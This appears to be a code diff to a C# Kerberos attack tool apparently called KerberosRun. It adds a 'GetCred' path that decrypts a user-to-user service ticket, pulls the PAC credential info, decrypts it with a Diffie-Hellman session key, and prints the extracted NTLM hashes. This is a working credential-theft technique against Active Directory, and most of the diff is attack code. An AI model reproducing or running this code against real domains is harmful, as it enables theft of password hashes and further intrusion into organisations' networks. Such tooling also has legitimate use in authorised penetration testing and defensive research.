@@ -3,10 +3,12 @@ using Kerberos.NET.Client;
 using Kerberos.NET.Credentials;
 using Kerberos.NET.Crypto;
 using Kerberos.NET.Entities;
+using Kerberos.NET.Ndr;
 using Kerberos.NET.Transport;
 using NLog;
 using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading;
@@ -66,6 +68,7 @@ namespace KerberosRun
 
             //U2U requires EncTktInSkey in KDC options
             KrbTicket u2uServerTicket = KerberosRun.U2UTicket ?? null;
+
             if (u2uServerTicket != null) { kdcOptions |= KdcOptions.EncTktInSkey; }
 
             //if (isUnconstrained)
@@ -229,7 +232,8 @@ namespace KerberosRun
 
 
             //Only include PA_FOR_USER when perform U2U for self to self
-            if (!string.IsNullOrWhiteSpace(rst.S4uTarget) || ((rst.UserToUserTicket != null) && (KerberosRun.U2UTarget == KerberosRun.User)))
+            //If we want PacCredentialInfo from PAC, we should not include PA_FOR_USER
+            if ((!string.IsNullOrWhiteSpace(rst.S4uTarget) || ((rst.UserToUserTicket != null) && (KerberosRun.U2UTarget.ToUpper() == KerberosRun.User.ToUpper()))) &&(!KerberosRun.GetCred))
             {
                 KrbPaForUser paS4u;
 
@@ -257,7 +261,7 @@ namespace KerberosRun
                         UserRealm = KerberosRun.Domain
                     };
                 }
-                
+
 
                 //TGS accepts sessionKey/subSessionKey whereas S4U2Self only accepts sessionKey, otherwise KRB_AP_ERR_MODIFIED
                 paS4u.GenerateChecksum(sessionKey.AsKey());
@@ -340,7 +344,53 @@ namespace KerberosRun
                 isReferral = true;
                 referralSessionKey = tgsDecryptedRepPart.Key;
             }
-            //var returnFlag = TicketFlags.Anonymous;
+
+
+            if (KerberosRun.GetCred)
+            {
+                KrbEncTicketPart ticketDecrypted = tgsRep.Ticket.EncryptedPart.Decrypt(
+                    KerberosRun.U2USessionKey.AsKey(),
+                    KeyUsage.Ticket,
+                    (ReadOnlyMemory<byte> t) => KrbEncTicketPart.DecodeApplication(t));
+
+                var pac = Helper.GetPAC(ticketDecrypted);
+
+                //Console.WriteLine("[-] PacCredentialInfo Data:");
+                //Console.WriteLine("    Data:   {0}", (BitConverter.ToString(pac.CredentialType.Marshal().ToArray())).Replace("-", ""));
+                //Console.WriteLine("    Length: {0}", pac.CredentialType.Marshal().ToArray().Length);
+                //Console.WriteLine("[-] SerializedData Data:"); 
+                //Console.WriteLine("    Data:   {0}", (BitConverter.ToString(credSerialData)).Replace("-", ""));
+                //Console.WriteLine("    Length: {0}", credSerialData.Length);
+
+                var credSerialData = pac.CredentialType.SerializedData.ToArray();
+
+
+                var plainCredData = Helper.KerberosDecrypt(KerberosRun.DHSessionKeyEType, 16, Utils.StringToByteArrayCrypto(KerberosRun.DHSessionKey), credSerialData);
+
+                PacCredentialData pacCredData = new PacCredentialData(plainCredData);
+
+                foreach (var pacCred in pacCredData.SuppCredential)
+                {
+  
+                    if ("NTLM".Equals(pacCred.PackageName.ToString()))
+                    {
+                        string hash = string.Empty;
+                        int version = BitConverter.ToInt32((byte[])(Array)pacCred.Credentials.ToArray(), 0);
+                        int flags = BitConverter.ToInt32((byte[])(Array)pacCred.Credentials.ToArray(), 4);
+                        if (flags == 3)
+                        {
+                            hash = String.Format("{0}:{1}", Utils.ByteArrayToStringCrypto(((byte[])(Array)pacCred.Credentials.ToArray()).Skip(8).Take(16).ToArray()), Utils.ByteArrayToStringCrypto(((byte[])(Array)pacCred.Credentials.ToArray()).Skip(24).Take(16).ToArray()));
+                        }
+                        else
+                        {
+                            hash = String.Format("{0}", Utils.ByteArrayToStringCrypto(((byte[])(Array)pacCred.Credentials.ToArray()).Skip(24).Take(16).ToArray()));
+                        }
+                        logger.Info("[-] PAC Credential Data");
+                        Console.WriteLine("    {0}: {1}", pacCred.PackageName, hash);
+                    }
+                }
+            }
+
         }
 
 
@@ -388,10 +438,12 @@ namespace KerberosRun
                     KeyUsage.Ticket,
                     (ReadOnlyMemory<byte> t) => KrbEncTicketPart.DecodeApplication(t));
                 Console.WriteLine("    * [Decrypted Ticket Enc-Part]:");
-                Displayer.PrintTicketEnc(ticketDecrypted);
+                Displayer.PrintTicketEnc(ticketDecrypted, sessionKey);
+
             }
 
-
+            
+            
         }
 
 
